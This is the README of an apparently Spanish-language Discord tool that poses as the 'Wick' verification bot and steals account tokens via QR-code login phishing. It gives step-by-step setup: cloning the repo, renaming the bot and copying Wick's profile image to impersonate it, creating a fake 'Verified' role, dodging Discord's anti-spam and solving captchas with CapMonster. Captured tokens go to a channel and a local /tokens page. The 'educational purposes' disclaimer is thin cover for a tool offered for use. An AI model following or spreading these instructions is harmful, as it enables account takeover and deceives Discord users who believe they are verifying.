
## Características

- **Se ve exactamente como un bot real.** (cuando se configura correctamente)
- **Memoria eficiente.** (no usa chromedriver.exe ni ningún navegador)
- **Muy estable y robusto.** (fallos y errores mínimos)
- **Único método de trabajo** (que no usa chromedriver.exe)
- **Personalizable** (cambie todas las configuraciones de apariencia para adaptarse a su servidor)

## Descargos de responsabilidad

- Este es un bot que no está afiliado a ninguno de los equipos de Discord o Discord Inc.
- Esto fue hecho con fines educativos. No está destinado a ser utilizado con fines maliciosos.
- Cualquier uso de este bot es bajo su propio riesgo. No me hago responsable de los daños que puedan ocurrir.
- Debe tener una cuenta <a href="https://capmonster.cloud">CapMonster</a> con fondos para un rendimiento óptimo.

## Cómo funciona

- El bot usa un socket web para conectarse a la API de Discord para recuperar una sesión de inicio de sesión.
- La sesión de inicio de sesión luego envía al bot una URL para generar un código QR para que el usuario lo escanee.
- Después de que el usuario escanee el código QR, el bot recuperará el token y lo enviará a un canal.

## Configuración

- **Requisitos previos de instalación** Los necesitará para poder ejecutar el bot de Discord.
  - [Nodo LTS](https://nodejs.org/en/)
  - [Git](https://git-scm.com/downloads)
- **Clonar el Repositorio e Instalar Dependencias**
  - `clon de git https://github.com/ulnk/scam.git`
  - `instalación npm`
- **Crear un nuevo Bot de Discord**
  - **Habilitar todos los intentos para el bot** Esto es muy importante. Si no habilita todos los intentos, el bot no funcionará.
    - https://discord.dev **Bot** > **Intentos de puerta de enlace privilegiados**
  - **Para obtener los mejores resultados** Discord tiene un sistema antispam que deshabilitará cualquier bot sospechoso. Para evitar esto, es mejor utilizar los recursos proporcionados que se encuentran [aquí](https://github.com/k4itrun/WickQrTokenGrabber/tree/master/profile). Para que encaje con el perfil, cambie el nombre del bot a 'Wick' y configure la imagen de perfil como la proporcionada.
  - **Invita al bot a tu servidor** Usa el siguiente enlace para invitar a tu bot a tu servidor. Cambie `CLIENTID` a su ID de cliente de discord bots.
    - Para obtener la identificación del cliente para su bot > https://discord.dev **Oauth2** > **General**
    - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
- **Configurar el Proyecto**
  - Cambiar el nombre de `ex.config.json` a `config.json`. Este se encuentra en `src/ex.config.json`.
  - Editar todas las claves y sus valores. No se requiere dar un valor a capmonster, sin embargo se recomienda.
  - Al ingresar `log.guildId` y `log.channelId`, debe ingresar la identificación del servidor y el canal en el que se encuentra el bot. De lo contrario, el bot no podrá enviar el token y se bloqueará.
- **Simular bot de verificación real**
  - En cada servidor en el que desee que esté el bot, cree un nuevo rol llamado "Verified". (Asegúrese de que el rol esté debajo del bot)
  - use el comando `/role` para establecer la identificación del rol en el rol que acaba de crear.
  - Esto se le dará al usuario después de escanear el qrcode.
- **Iniciar el bot**
  - `inicio de ejecución npm`
  - Una vez que el bot esté activo, use el comando `/spawn` para generar el mensaje de verificación.
  - Tambien se abrira el puerto **3000** en [localhost:3000](http://localhost:3000/) en la ruta [localhost:3000/tokens](http://localhost:3000/tokens) se encuentran los tokens que fueron tomados de el codigo QR

(_único archivo ejecutable próximamente_)

## Imagen de vista previa

![Vista previa](https://user-images.githubusercontent.com/93608862/224277763-d9734632-2469-4b98-b239-27cd6c3247e9.png)

## Bibliotecas utilizadas

- **discord.js** (discord bot) <img alt="insignia de vista previa" src="https://img.shields.io/npm/v/discord.js">
- **crypto** (claves privadas y claves públicas) <img alt="insignia de vista previa" src="https://img.shields.io/npm/v/crypto">
- **ws** (socket web) <img alt="insignia de vista previa" src="https://img.shields.io/npm/v/ws">
- **capmonster** (anti-captcha)<img alt="insignia de vista previa" src="https://img.shields.io/npm/v/node-capmonster">

https://discord.gg/team-arcades servidor de soporte

Si necesitas ayuda [yvk4itrun](https://discord.com/users/1088554690268119103) o agregame como **yvk4itrun**

[X] Creditos **k4itrun** & **End**

# DUALHOOK Solo de testeo y con errores solucionados.
